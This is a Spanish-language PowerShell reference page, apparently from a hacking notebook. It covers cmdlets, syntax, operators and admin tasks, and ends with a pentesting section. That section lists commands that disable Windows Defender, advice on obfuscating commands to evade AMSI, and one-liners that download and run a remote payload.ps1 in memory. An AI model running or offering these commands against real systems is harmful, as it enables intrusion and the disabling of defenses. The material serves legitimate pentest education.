---
icon: book-skull
---

# Comandos PowerShell Windows

> Paginas en las que hay mas informacion sobre esto:

URL = [Guía PowerShell para Hackers](https://achirou.com/powershell-para-hackers-guia-rapida/#Powershell_para_Administracion_de_Servidores_y_Seguridad)

URL = [Introducción a PowerShell](https://programminghistorian.org/es/lecciones/introduccion-a-powershell)

PowerShell es una herramienta poderosa en Windows que permite automatizar tareas, gestionar sistemas y, en el contexto del **hacking ético**, realizar auditorías y pruebas de penetración.

### 📜 Comandos útiles de PowerShell

| **Comando**            | **Alias**                                 | **Descripción**                                                                                                                                                                          |
| ---------------------- | ----------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Help Get-Command` | _(Ninguno)_                               | Muestra información de ayuda sobre el comando `Get-Command`, que enumera todos los comandos de PowerShell. Puedes reemplazar `Get-Command` por cualquier otro comando para ver su ayuda. |
| `Get-ChildItem`        | `dir`, `ls`, `gci`                        | Lista todos los archivos y carpetas en el directorio actual.                                                                                                                             |
| `Get-Location`         | `pwd`, `gl`                               | Muestra el directorio de trabajo actual.                                                                                                                                                 |
| `Set-Location`         | `cd`, `chdir`, `sl`                       | Cambia el directorio de trabajo actual a una ubicación específica.                                                                                                                       |
| `Get-Content`          | `cat`, `gc`, `type`                       | Muestra el contenido de un archivo en la ubicación especificada.                                                                                                                         |
| `Copy-Item`            | `copy`, `cp`, `cpi`                       | Copia un archivo o carpeta de una ubicación a otra.                                                                                                                                      |
| `Remove-Item`          | `del`, `erase`, `rd`, `ri`, `rm`, `rmdir` | Elimina los archivos o carpetas especificados.                                                                                                                                           |
| `Move-Item`            | `mi`, `move`, `mv`                        | Mueve un archivo o carpeta de una ubicación a otra.                                                                                                                                      |
| `New-Item`             | `ni`                                      | Crea un nuevo archivo o carpeta.                                                                                                                                                         |
| `Out-File`             | `>`, `>>`                                 | Envía la salida a un archivo. Se recomienda usar `Out-File` al especificar parámetros.                                                                                                   |
| `Invoke-WebRequest`    | `curl`, `iwr`, `wget`                     | Descarga contenido de una página web en Internet.                                                                                                                                        |
| `Write-Output`         | `echo`, `write`                           | Envía los objetos especificados a la canalización. Si es el último comando, muestra la salida en consola.                                                                                |
| `Clear-Host`           | `cls`, `clear`                            | Limpia la consola.                                                                                                                                                                       |

## 📖 Sintaxis de PowerShell

PowerShell es una herramienta extremadamente poderosa con una gran cantidad de comandos. Comprender su **sintaxis** es esencial para aprovechar al máximo su potencial, especialmente al crear scripts reutilizables.

***

### 📌 Parámetros en PowerShell

Los **parámetros** son argumentos que permiten modificar el comportamiento de un comando o script. Permiten escribir scripts más flexibles y dinámicos.

#### 📝 Ejemplo básico de sintaxis

Un comando con dos parámetros (uno con valor asignado y otro sin valor):

```powershell
Do-Something -Parameter1 value1 -Parameter2
```

🔎 Para buscar todos los comandos que incluyen un parámetro específico (por ejemplo, `ComputerName`):

```powershell
Get-Help * -Parameter ComputerName
```

Esto lista todos los comandos que aceptan el parámetro `-ComputerName`.

### 🛡️ Parámetros de mitigación de riesgos

PowerShell incluye algunos **parámetros comunes** que ayudan a reducir errores y riesgos al ejecutar comandos potencialmente peligrosos.

| **Parámetro** | **Descripción**                                    | **Ejemplo**                                                                                  |
| ------------- | -------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| `-Confirm`    | Solicita confirmación antes de ejecutar la acción. | <p>Crear un archivo <code>test.txt</code>:<br><code>ni test.txt -Confirm</code></p>          |
| `-WhatIf`     | Muestra lo que haría el comando, sin ejecutarlo.   | <p>Simular la eliminación de <code>test.txt</code>:<br><code>del test.txt -WhatIf</code></p> |

✅ **Recomendación:** Usa `-WhatIf` antes de ejecutar comandos destructivos para prevenir errores.

### ⚠️ Buenas prácticas

* 📖 Usa `Get-Help <comando>` para consultar los parámetros disponibles en cualquier comando.
* 🚧 Antes de correr scripts en sistemas críticos, prueba con `-WhatIf` y revisa el resultado.
* 🛡️ Combina `-Confirm` con scripts automatizados para añadir una capa de seguridad interactiva.

## 🔗 Pipes en PowerShell

PowerShell utiliza el carácter de **canalización** `|` para pasar la salida de un comando como entrada al siguiente, de manera similar a cómo funcionan las pipes en Bash y otros shells.

***

### 📜 Sintaxis básica

```powershell
Command1 | Command2 | Command3
```

La salida de `Command1` se envía como entrada a `Command2`, y así sucesivamente.

***

### 📝 Ejemplo avanzado

```powershell
Get-Service |
Where-Object -Property Status -EQ Running |
Select-Object Name, DisplayName, StartType |
Sort-Object -Property StartType, Name
```

🔎 **Explicación paso a paso:**

1. `Get-Service`: obtiene una lista de todos los servicios de Windows.
2. `Where-Object`: filtra solo los servicios con `Status` igual a `Running`.
3. `Select-Object`: selecciona las columnas `Name`, `DisplayName` y `StartType`.
4. `Sort-Object`: ordena los resultados por `StartType` y `Name`.

***

### 🛠️ Otros ejemplos de tuberías

| **Comando**                                                | **Descripción**                                                                               |
| ---------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `"plan_A.txt" \| Rename-Item -NewName "plan_B.md"`         | Cambia el nombre del archivo `plan_A.txt` a `plan_B.md`.                                      |
| `Get-ChildItem \| Select-Object basename \| Sort-Object *` | Lista los nombres de todos los archivos en el directorio actual y los ordena alfabéticamente. |

## 🧱 Objetos en PowerShell

PowerShell está basado en objetos, no en texto plano como otros shells tradicionales. Esto significa que los comandos no solo devuelven texto, sino **objetos completos** con **propiedades** y **métodos**, similares a los de lenguajes orientados a objetos como **C#**, **Java** y **Python**.

***

### 📜 ¿Qué es un objeto?

Un objeto es un tipo de dato que contiene:

* **Propiedades**: características o datos del objeto.
* **Métodos**: funciones que se pueden ejecutar sobre el objeto.

En PowerShell puedes acceder a ellos con el **operador punto (`.`)**:

```powershell
$miObjeto.Propiedad
$miObjeto.Metodo()
```

***

### 📝 Ejemplo práctico

#### 🔍 Explorar un objeto con `Get-Member`

```powershell
Get-Service -Name Fax | Get-Member
```

1. `Get-Service -Name Fax`: obtiene el servicio llamado _Fax_ como objeto.
2. `Get-Member`: lista todas las **propiedades** y **métodos** del objeto devuelto.

***

#### 📖 Consultar una propiedad

```powershell
(Get-Service -Name Fax).Status
```

Devuelve el estado del servicio _Fax_. Por ejemplo: `Stopped`.

***

#### 🧪 Ejecutar un método

```powershell
(Get-Service -Name Fax).GetType()
```

Muestra que el objeto _Fax_ es en realidad un objeto `.NET` de tipo `ServiceController`.

## 📝 Variables y Expresiones Regulares en PowerShell

PowerShell permite trabajar con **variables** y utilizar **expresiones regulares (regex)** para manipular y buscar datos de forma avanzada. Son conceptos clave para automatizar tareas y analizar información.

***

### 💾 Variables en PowerShell

#### 📌 Comandos básicos para variables

| DOMINIO                        | DESCRIPCIÓN                                                                        |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| `New-Variable var1`            | Crear una nueva variable `var1`sin definir su valor                                |
| `Get-Variable my*`             | Enumera todas las variables en uso que comienzan con » `my`\*»                     |
| `Remove-Variable bad_variable` | Eliminar la variable llamada » `bad_variable`»                                     |
| `$var = "string"`              | Asignar el valor » `string`» a una variable`$var`                                  |
| `$a,$b = 0`                    | Asigne el valor 0 a las variables `$a`,`$b`                                        |
| `$a,$b,$c = 'a','b','c'`       | Asigne los caracteres `'a'`, `'b'`, `'c'`a variables con nombres respectivos       |
| `$a,$b = $b,$a`                | Intercambiar los valores de las variables `$a`y`$b`                                |
| `$var = [int]5`                | Forzar que la variable `$var`esté fuertemente tipada y solo admita valores enteros |

***

#### 🔑 Variables especiales

| **Variable** | **Descripción**                                                 |
| ------------ | --------------------------------------------------------------- |
| `$HOME`      | Ruta al directorio de inicio del usuario.                       |
| `$NULL`      | Representa un valor vacío o nulo.                               |
| `$TRUE`      | Valor booleano VERDADERO.                                       |
| `$FALSE`     | Valor booleano FALSO.                                           |
| `$PID`       | Identificador de proceso (PID) del proceso de la sesión actual. |

***

### 🔍 Expresiones Regulares (Regex) en PowerShell

Una **expresión regular** es un patrón de coincidencia de caracteres usado para buscar y manipular texto.

#### 📜 Sintaxis básica de regex

| SINTAXIS DE EXPRESIONES REGULARES | DESCRIPCIÓN                                                                                                                                                                                   |
| --------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `[ ]`                             | Caracteres permitidos, por ejemplo, `[abcd]`significa`'a'/'b'/'c'/'d'`                                                                                                                        |
| `[aeiou]`                         | Carácter vocal único en inglés.                                                                                                                                                               |
| `^`                               | <p>1. Úselo entre corchetes <code>[ ]</code>para indicar exclusión<br>2. Para hacer coincidir el comienzo de una cadena</p>                                                                   |
| `[^aeiou]`                        | Carácter de consonante única en inglés.                                                                                                                                                       |
| `$`                               | Para hacer coincidir el final de una cadena                                                                                                                                                   |
| `-`                               | Úselo con corchetes `[ ]`para indicar rangos de caracteres                                                                                                                                    |
| `[A-Z]`                           | Caracteres alfabéticos en mayúsculas                                                                                                                                                          |
| `[a-z]`                           | Caracteres alfabéticos en minúscula                                                                                                                                                           |
| `[0-9]`                           | Caracteres numéricos                                                                                                                                                                          |
| `[ -~]`                           | Todos los caracteres basados ​​en ASCII (por lo tanto imprimibles)                                                                                                                            |
| `\t`                              | Pestaña                                                                                                                                                                                       |
| `\n`                              | Nueva línea                                                                                                                                                                                   |
| `\r`                              | Retorno de carro                                                                                                                                                                              |
| `.`                               | Cualquier carácter excepto un `\n`carácter de nueva línea ( ); comodín                                                                                                                        |
| `*`                               | Haga coincidir la expresión regular que tiene como prefijo cero o más veces.                                                                                                                  |
| `+`                               | Haga coincidir la expresión regular que tiene como prefijo una o más veces.                                                                                                                   |
| `?`                               | Haga coincidir la expresión regular con el prefijo cero o una vez.                                                                                                                            |
| `{n}`                             | Un símbolo de expresión regular debe coincidir exactamente `n`con los tiempos.                                                                                                                |
| `{n,}`                            | Un símbolo de expresión regular debe coincidir al menos `n`veces.                                                                                                                             |
| `{n,m}`                           | Un símbolo de expresión regular debe coincidir entre `n`y `m`horas inclusive.                                                                                                                 |
| `\`                               | Escapar; Interprete los siguientes caracteres reservados para expresiones regulares como los caracteres literales correspondientes:`[]().\^$\|?*+{}`                                          |
| `\d`                              | dígito decimal                                                                                                                                                                                |
| `\D`                              | Dígito no decimal, como hexadecimal                                                                                                                                                           |
| `\w`                              | Carácter alfanumérico y guión bajo (“ [carácter de palabra](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions#word-characters) ”) |
| `\W`                              | [Carácter](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions#word-characters) no palabra                                          |
| `\s`                              | Carácter espacial                                                                                                                                                                             |
| `\S`                              | Carácter no espacial                                                                                                                                                                          |

***

#### ✅ Comparar cadenas con regex

| **Operador**                 | **Descripción**                               |
| ---------------------------- | --------------------------------------------- |
| `<string> -Match <regex>`    | Devuelve `True` si la cadena coincide.        |
| `<string> -NotMatch <regex>` | Devuelve `True` si la cadena **no** coincide. |

***

#### 📝 Ejemplos

| EXPRESIÓN REGULAR   | CUERDAS QUE`-MATCH` | CUERDAS QUE HACEN`-NOTMATCH` |
| ------------------- | ------------------- | ---------------------------- |
| `'Hello world'`     | `'Hello world'`     | `'Hello World'`              |
| `'^Windows$'`       | `'Windows'`         | `'windows'`                  |
| `'[aeiou][^aeiou]'` | `'ah'`              | `'lo'`                       |
| `'[a-z]'`           | `'x'`               | `'X'`                        |
| `'[a-z]+-?\d\D'`    | `'server0F','x-8B'` | `'--AF'`                     |
| `'\w{1,3}\W'`       | `'Hey!'`            | `'Fast'`                     |
| `'.{8}'`            | `'Break up'`        | `'No'`                       |
| `'..\s\S{2,}'`      | `'oh no'`           | `'\n\nYes'`                  |
| `'\d\.\d{3}'`       | `'1.618'`           | `'3.14'`                     |

## Operadores

PowerShell tiene muchos [operadores](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators) . A continuación te presentamos los más utilizados.

En los ejemplos siguientes, las variables `$a`y `$b`tienen los valores 10 y 20, respectivamente. El símbolo `→`indica el valor resultante e `⇔`indica equivalencia.

### Operadores aritméticos:

| OPERADOR | DESCRIPCIÓN                                                                                   | EJEMPLO         |
| -------- | --------------------------------------------------------------------------------------------- | --------------- |
| `+`      | Suma. Agrega valores a ambos lados del operador.                                              | `$a + $b → 30`  |
| `-`      | Sustracción. Resta el operando de la derecha del operando de la izquierda.                    | `$a - $b → -10` |
| `*`      | Multiplicación. Multiplica valores a ambos lados del operador.                                | `$a * $b → 200` |
| `/`      | División. Divide el operando de la izquierda por el operando de la derecha.                   | `$b / $a → 2`   |
| `%`      | Módulo. Divide el operando de la izquierda por el operando de la derecha y devuelve el resto. | `$b % $a → 0`   |

### Operadores de comparación:

| OPERADOR | SÍMBOLO MATEMÁTICO (NO POWERSHELL) | DESCRIPCIÓN         | EJEMPLO              |
| -------- | ---------------------------------- | ------------------- | -------------------- |
| `eq`     | =                                  | Igual               | `$a -eq $b → $false` |
| `ne`     | ≠                                  | Desigual            | `$a -ne $b → $true`  |
| `gt`     | >                                  | Mas grande que      | `$b -gt $a → $true`  |
| `ge`     | ≥                                  | Mayor qué o igual a | `$b -ge $a → $true`  |
| `lt`     | <                                  | Menos que           | `$b -lt $a → $false` |
| `le`     | ≤                                  | Menos que o igual a | `$b -le $a → $false` |

### Operadores de Asignación:

| OPERADOR | DESCRIPCIÓN                                                                                                     | EJEMPLO                                                                       |
| -------- | --------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| `=`      | Asigne valores de los operandos del lado derecho al operando del lado izquierdo.                                | Asignar la suma de variables `$a`y `$b`a una nueva variable`$c: $c = $a + $b` |
| `+=`     | Agregue el operando del lado derecho al operando izquierdo y asigne el resultado al operando izquierdo.         | `$c += $a ⇔ $c = $c + $a`                                                     |
| `-=`     | Resta el operando del lado derecho del operando izquierdo y asigna el resultado al operando del lado izquierdo. | `$c -= $a ⇔ $c = $c - $a`                                                     |

### Operadores logicos:

| OPERADOR  | DESCRIPCIÓN                                                                                                                    | EJEMPLO                 |
| --------- | ------------------------------------------------------------------------------------------------------------------------------ | ----------------------- |
| `-and`    | Y lógico. Si ambos operandos son verdaderos/distintos de cero, entonces la condición se vuelve verdadera.                      | `($a -and $b) → $true`  |
| `-or`     | O lógico. Si alguno de los dos operandos es verdadero/distinto de cero, entonces la condición se vuelve verdadera.             | `($a -or 0) → $true`    |
| `-not, !` | NO lógico. Negación de una expresión booleana determinada.                                                                     | `!($b -eq 20) → $false` |
| `-xor`    | O exclusivo lógico. Si solo uno de los dos operandos es verdadero/distinto de cero, entonces la condición se vuelve verdadera. | `($a -xor $b) → $false` |

### Operadores de redireccionamiento:

| OPERADOR | DESCRIPCIÓN                                                        |
| -------- | ------------------------------------------------------------------ |
| `>`      | Envíe la salida al archivo o dispositivo de salida especificado.   |
| `>>`     | Adjunte la salida al archivo o dispositivo de salida especificado. |
| `>&1`    | Redirige el flujo especificado al flujo de salida estándar.        |

Al agregar un prefijo numérico a los operadores de redirección de PowerShell, los operadores de redirección le permiten enviar tipos específicos de salida de comando a varios destinos:

| PREFIJO DE REDIRECCIÓN | FLUJO DE SALIDA                                                                           | EJEMPLO                                                                                                                             |
| ---------------------- | ----------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `*`                    | Toda la salida                                                                            | Redirigir todas las transmisiones a`out.txt: Do-Something *> out.txt`                                                               |
| `1`                    | Salida estándar (esta es la secuencia predeterminada si omite el prefijo de redirección). | Agregar salida estándar a`success.txt: Do-Something 1>> success.txt`                                                                |
| `2`                    | Error estándar                                                                            | Redirige el error estándar a la salida estándar, que se envía a un archivo llamado`dir.log: dir 'C:\', 'fakepath' 2>&1 > .\dir.log` |
| `3`                    | Mensajes de advertencia                                                                   | Enviar salida de advertencia a`warning.txt: Do-Something 3> warning.txt`                                                            |
| `4`                    | Salida detallada                                                                          | <p>Agregue <code>verbose.txt</code>con la salida detallada:<br><code>Do-Something 4>> verbose.txt</code></p>                        |
| `5`                    | Mensajes de depuración                                                                    | <p>Enviar salida de depuración al error estándar:<br><code>Do-Something 5>&#x26;1</code></p>                                        |
| `6`                    | Información (PowerShell 5.0+)                                                             | <p>Suprimir toda la salida de información: <br><code>Do-Something 6>$null</code></p>                                                |

### Operadores de coincidencia y expresión regular (regex):

| OPERADOR                  | DESCRIPCIÓN                                                                    | EJEMPLO                                                                                                                                                                                                                                                           |
| ------------------------- | ------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-Replace`                | Reemplazar cadenas que coincidan con un patrón de expresiones regulares        | Producción`“i like ! !”: $toy = "i like this toy"; $work = $toy -Replace "toy\|this","!"; $work`                                                                                                                                                                  |
| `-Like, -NotLike`         | Comprobar si una cadena coincide con un patrón comodín (o no)                  | <p>Genere todos los archivos *.bat en el directorio de trabajo actual:<br><code>Get-ChildItem | Where-Object {$_.name  -Like "*.bat"}</code><br><br>Genere todos los demás archivos:<br><code>Get-ChildItem | Where-Object {$_.name  -NotLike "*.bat"}</code></p> |
| `-Match, -NotMatch`       | Compruebe si una cadena coincide con un patrón de expresiones regulares (o no) | <p>Los siguientes ejemplos se evalúan como VERDADERO:<br><code>'blog' -Match 'b[^aeiou][aeiuo]g' 'blog' -NotMatch 'b\d\wg'</code></p>                                                                                                                             |
| `-Contains, -NotContains` | Comprobar si una colección contiene un valor (o no)                            | <p>Los siguientes ejemplos se evalúan como VERDADERO:<br><code>@("Apple","Banana","Orange") -Contains "Banana" @("Au","Ag","Cu") -NotContains "Gold"</code></p>                                                                                                   |
| `-In, -NotIn`             | Comprobar si un valor está (no) en una colección                               | <p>Los siguientes ejemplos se evalúan como VERDADERO:<br><code>"blue" -In @("red", "green", "blue") "blue" -NotIn @("magenta", "cyan", yellow")</code></p>                                                                                                        |

| OPERADOR                  | DESCRIPCIÓN                                                                    | EJEMPLO                                                                                                                                                                                                                                                           |
| ------------------------- | ------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-Replace`                | Reemplazar cadenas que coincidan con un patrón de expresiones regulares        | Producción`“i like ! !”: $toy = "i like this toy"; $work = $toy -Replace "toy\|this","!"; $work`                                                                                                                                                                  |
| `-Like, -NotLike`         | Comprobar si una cadena coincide con un patrón comodín (o no)                  | <p>Genere todos los archivos *.bat en el directorio de trabajo actual:<br><code>Get-ChildItem | Where-Object {$_.name  -Like "*.bat"}</code><br><br>Genere todos los demás archivos:<br><code>Get-ChildItem | Where-Object {$_.name  -NotLike "*.bat"}</code></p> |
| `-Match, -NotMatch`       | Compruebe si una cadena coincide con un patrón de expresiones regulares (o no) | <p>Los siguientes ejemplos se evalúan como VERDADERO:<br><code>'blog' -Match 'b[^aeiou][aeiuo]g' 'blog' -NotMatch 'b\d\wg'</code></p>                                                                                                                             |
| `-Contains, -NotContains` | Comprobar si una colección contiene un valor (o no)                            | <p>Los siguientes ejemplos se evalúan como VERDADERO:<br><code>@("Apple","Banana","Orange") -Contains "Banana" @("Au","Ag","Cu") -NotContains "Gold"</code></p>                                                                                                   |
| `-In, -NotIn`             | Comprobar si un valor está (no) en una colección                               | <p>Los siguientes ejemplos se evalúan como VERDADERO:<br><code>"blue" -In @("red", "green", "blue") "blue" -NotIn @("magenta", "cyan", yellow")</code></p>                                                                                                        |

### Operadores varios:

| DOMINIO | DESCRIPCIÓN                                                                                              | EJEMPLO                                                                                                                                                                 |
| ------- | -------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `()`    | Agrupamiento; anular la precedencia del operador en expresiones                                          | <p>Calcular esta expresión te da el valor 4:<br><code>(1+1)*2</code></p>                                                                                                |
| `$()`   | Obtener el resultado de una o más declaraciones                                                          | <p>Obtenga la fecha y hora de hoy:<br><code>"Today is $(Get-Date)"</code></p>                                                                                           |
| `@()`   | Obtener los resultados de una o más declaraciones en forma de matrices.                                  | <p>Obtenga solo nombres de archivos en el directorio de trabajo actual:<br><code>@(Get-ChildItem | Select-Object Name)</code></p>                                       |
| `[]`    | Convierte objetos al tipo específico                                                                     | <p>Comprueba que hay 31 días entre el 20 de enero y el 20 de febrero de 1988:<br><code>[DateTime] '2/20/88' - [DateTime] '1/20/88' -eq [TimeSpan] '31'# True</code></p> |
| `&`     | Ejecute un comando/canalización como un trabajo en segundo plano de Windows Powershell (PowerShell 6.0+) | `Get-Process -Name pwsh &`                                                                                                                                              |

## 📝 Tablas Hash, Comentarios y Control de Flujo en PowerShell

En PowerShell puedes usar **tablas hash**, comentarios y estructuras de control de flujo para crear scripts más estructurados y potentes.

***

### 🗂️ Tablas Hash en PowerShell

Una **tabla hash** (también llamada diccionario o matriz asociativa) almacena datos como **pares clave-valor**.

#### 📌 Sintaxis y ejemplos

| **Sintaxis**                                | **Descripción**                          | **Ejemplo**                                       |
| ------------------------------------------- | ---------------------------------------- | ------------------------------------------------- |
| `@{<key> = <value>; [<key> = <value>] ...}` | Crea una tabla hash.                     | `@{Number = 1; Shape = "Square"; Color = "Blue"}` |
| `[ordered]@{<key> = <value>; ...}`          | Tabla hash ordenada.                     | `[ordered]@{Number=1; Shape="Square"}`            |
| `$hash.<key> = <value>`                     | Asigna un valor a una clave en `$hash`.  | `$hash.id = 100`                                  |
| `$hash["<key>"] = "<value>"`                | Otra forma de asignar valor a una clave. | `$hash["Name"] = "Alice"`                         |
| `$hash.Add("<key>", "<value>")`             | Agrega un par clave-valor a `$hash`.     | `$hash.Add("Time", "Now")`                        |
| `$hash.Remove(<key>)`                       | Elimina un par clave-valor de `$hash`.   | `$hash.Remove("Time")`                            |
| `$hash.<key>`                               | Obtiene el valor de una clave.           | `$hash.id # 100`                                  |

***

### 🗒️ Comentarios en PowerShell

Los comentarios ayudan a **documentar** y organizar el código.

| **Símbolo** | **Descripción**                | **Ejemplo**                              |
| ----------- | ------------------------------ | ---------------------------------------- |
| `#`         | Comentario de una línea.       | `# Esto es un comentario.`               |
| `<# ... #>` | Comentario de varias líneas.   | `<# Esto es un bloque de comentario. #>` |
| `` ` ``     | Escapar caracteres especiales. | ``"`"Hello`""``                          |
| `` `t ``    | Tabulación.                    | `'hello`tworld'\`                        |
| `` `n ``    | Nueva línea.                   | `'hello`nworld'\`                        |
| `` ` ``     | Continuación de línea.         | ``ni test.txt ` -WhatIf``                |

***

### 🔄 Control de flujo en PowerShell

#### 📜 Bucles

| **Sintaxis**                                           | **Descripción**                                   | **Ejemplo**                                     |
| ------------------------------------------------------ | ------------------------------------------------- | ----------------------------------------------- |
| `for (<Init>; <Condition>; <Repeat>) { <Statements> }` | Ejecuta un bucle mientras se cumpla la condición. | `for ($i=1; $i -le 10; $i++) { Write-Host $i }` |
| `foreach ($item in $collection) { <Statements> }`      | Itera sobre cada elemento de una colección.       | \`Get-ChildItem                                 |
| `while (<Condition>) { <Statements> }`                 | Ejecuta mientras la condición sea verdadera.      | `while($a -ne 3){ $a++; Write-Host $a }`        |

***

#### 🧠 Condicionales

| **Sintaxis**                                                                                   | **Descripción**                                | **Ejemplo**                                                                                                                                                     |
| ---------------------------------------------------------------------------------------------- | ---------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `if (<Test1>) { <Statements1> } [elseif (<Test2>) { <Statements2> }] [else { <Statements3> }]` | Ejecuta un bloque de código según condiciones. | `if ($a -gt 2) { Write-Host "El valor $a es mayor que 2." } elseif ($a -eq 2) { Write-Host "El valor $a es igual a 2." } else { Write-Host "Es menor que 2." }` |

## 🛠️ PowerShell para Administradores de Sistemas

PowerShell es una herramienta esencial para **automatizar tareas administrativas**, como gestión de usuarios, copias de seguridad, monitorización y administración remota. Combinado con el **Programador de tareas de Windows**, permite realizar trabajos repetitivos de forma eficiente.

***

### 🖇️ Conexión y administración de red

| **Comando**                                                                                                            | **Descripción**                                                                                                                   |
| ---------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `New-PSDrive –Name "L" –PSProvider FileSystem –Root "\\path\to\data" –Persist`                                         | Configura una unidad de red. Usa una letra mayúscula no utilizada (no C:) como `-Name` y apunta `-Root` a una ruta de red válida. |
| `Enable-PSRemoting`                                                                                                    | Habilita la comunicación remota de PowerShell en una computadora.                                                                 |
| `Invoke-Command -ComputerName pc01,pc02,pc03 -ScriptBlock {cmd /c c:\path\to\setup.exe /config C:\path\to\config.xml}` | Envía actualizaciones de software a una red de computadoras (pc01, pc02, pc03).                                                   |
| `Enable-NetFirewallRule`                                                                                               | Habilita una regla de firewall previamente deshabilitada.                                                                         |

***

### 👤 Gestión de usuarios

| **Comando**                                                                                                     | **Descripción**                                                                        |
| --------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `$Password = Read-Host -AsSecureString`                                                                         | Solicita una contraseña y la guarda como una cadena segura en la variable `$Password`. |
| `New-LocalUser "User03" -Password $Password -FullName "Third User" -Description "Description of this account."` | Crea un usuario local con la contraseña almacenada, nombre completo y descripción.     |

***

### 🔄 Monitorización y procesos

| **Comando**                                                                                                                              | **Descripción**                                                              |
| ---------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `Get-Service`                                                                                                                            | Muestra los servicios en ejecución y detenidos de la computadora.            |
| `Get-Process`                                                                                                                            | Lista los procesos en una computadora local.                                 |
| `While(1) { $p = get-counter '\Process(*)\% Processor Time'; cls; $p.CounterSamples \| sort -desc CookedValue \| select -f 15 \| ft -a}` | Supervisa procesos en ejecución y muestra el uso de CPU como `top` en Linux. |
| `Start-Job`                                                                                                                              | Inicia un trabajo en segundo plano localmente.                               |
| `Receive-Job`                                                                                                                            | Obtiene los resultados del trabajo en segundo plano.                         |
| `New-PSSession`                                                                                                                          | Crea una conexión persistente a una computadora local o remota.              |
| `Get-PSSession`                                                                                                                          | Obtiene las sesiones activas de PowerShell.                                  |
| `Start-Sleep 10`                                                                                                                         | Pausa la ejecución durante 10 segundos.                                      |

***

### 💾 Copias de seguridad y archivos

| **Comando**                                                                                 | **Descripción**                                                           |
| ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| `Get-ChildItem c:\data -r \| % {Copy-Item -Path $_.FullName -Destination \\path\to\backup}` | Crea una copia de seguridad remota del directorio `c:\data`.              |
| `? {!($_.PsIsContainer) -AND $_.LastWriteTime -gt (Get-Date).date}`                         | Filtra solo los archivos modificados para realizar una copia incremental. |
| `ConvertTo-Html`                                                                            | Convierte objetos de .NET Framework en páginas web HTML.                  |

***

### 🌐 Comandos útiles para redes y APIs

| **Comando**             | **Descripción**                                             |
| ----------------------- | ----------------------------------------------------------- |
| `Invoke-RestMethod`     | Envía una solicitud HTTP o HTTPS a un servicio web RESTful. |
| `Get-Hotfix`            | Busca parches o actualizaciones de software instalados.     |
| `Get-Command *-Service` | Lista todos los comandos con el sufijo `-Service`.          |

## 🕵️ PowerShell para Pentesters

> _“Un gran poder conlleva una gran responsabilidad.”_\
> PowerShell es una herramienta poderosa tanto para administradores como para atacantes. Por ello, todo **pentester** competente debe dominarla para auditar, identificar y explotar vulnerabilidades de manera ética.

***

### 🚨 Modificando políticas de ejecución

| **Comando**                                                                                                                                                                               | **Descripción**                                                                            |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `Set-ExecutionPolicy -ExecutionPolicy Bypass`                                                                                                                                             | Permite ejecutar cualquier comando/script de PowerShell sin restricciones ni advertencias. |
| <p>⚠ <strong>Mito</strong>: Cambiar la ExecutionPolicy protege contra malware.<br>✅ <strong>Hecho</strong>: Es solo una “valla” autoimpuesta; no protege una máquina ya comprometida.</p> |                                                                                            |

***

### 🛡️ Evadiendo AMSI y antivirus

| **Comando**                                                                                                                                                                      | **Descripción**                                                                                 |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| `Set-MpPreference -DisableIOAVProtection $true`                                                                                                                                  | Desactiva la protección de entrada y salida de AMSI. Requiere ofuscación para evitar detección. |
| `Set-MpPreference -DisableRealTimeMonitoring $true`                                                                                                                              | Apaga Windows Defender. También necesita ser ofuscado para ejecutar sin ser detectado.          |
| <p>🔥 <strong>Técnicas de evasión AMSI</strong>:<br>• Ofuscar scripts (variables ficticias, codificación Base64).<br>• Ejecutar comandos línea por línea para evadir firmas.</p> |                                                                                                 |

***

### ☁️ Descarga y ejecución en memoria

| **Comando**                                                                                        | **Descripción**                                                                                                 |
| -------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `Import-Module /path/to/module`                                                                    | Importa un módulo desde una ruta específica.                                                                    |
| `iex (New-Object Net.WebClient).DownloadString('https://[webserver_ip]/payload.ps1')`              | Descarga y ejecuta un script `payload.ps1` directamente en memoria (RAM).                                       |
| `iex (iwr http://[webserver_ip]/some_script.ps1 -UseBasicParsing)`                                 | Descarga un script `some_script.ps1` y lo ejecuta desde RAM.                                                    |
| `iex (New-Object Net.WebClient).DownloadString('http://localhost/powerview.ps1'); Get-NetComputer` | Carga y ejecuta funciones de PowerView desde RAM (ejemplo: enumerar computadoras de red con `Get-NetComputer`). |

***

### 🔎 Comandos de enumeración

| **Comando**                 | **Descripción**                                                         |
| --------------------------- | ----------------------------------------------------------------------- |
| `net accounts`              | Obtiene la política de contraseñas de la máquina.                       |
| `whoami /priv`              | Lista los privilegios del usuario actual.                               |
| `ipconfig /all`             | Enumera todas las interfaces de red, direcciones IP y DNS configurados. |
| `Get-LocalUser \| Select *` | Lista todos los usuarios locales de la máquina.                         |
| `Get-NetRoute`              | Muestra la tabla de enrutamiento IP.                                    |
| `Get-Command`               | Lista todos los comandos de PowerShell disponibles.                     |

***

### 📦 Herramientas recomendadas para Pentesters

